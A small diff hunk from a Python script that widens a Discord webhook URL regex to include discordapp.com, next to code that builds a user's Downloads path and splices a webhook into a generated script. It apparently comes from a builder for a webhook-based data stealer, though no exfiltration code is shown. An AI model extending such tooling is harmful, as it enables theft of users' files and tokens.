@@ -214,7 +214,7 @@ downloads_path = "C:/Users/%s/Downloads/" % username
 
 
 
-pattern = "[http|https]+://[canary.discord.com|discord.com]+/api/webhooks/[\w\S/]+"
+pattern = "[http|https]+://[canary.discord.com|discord.com|discordapp.com]+/api/webhooks/[\w\S/]+"
 
 
 webhook = '""" + webhook + r"""'
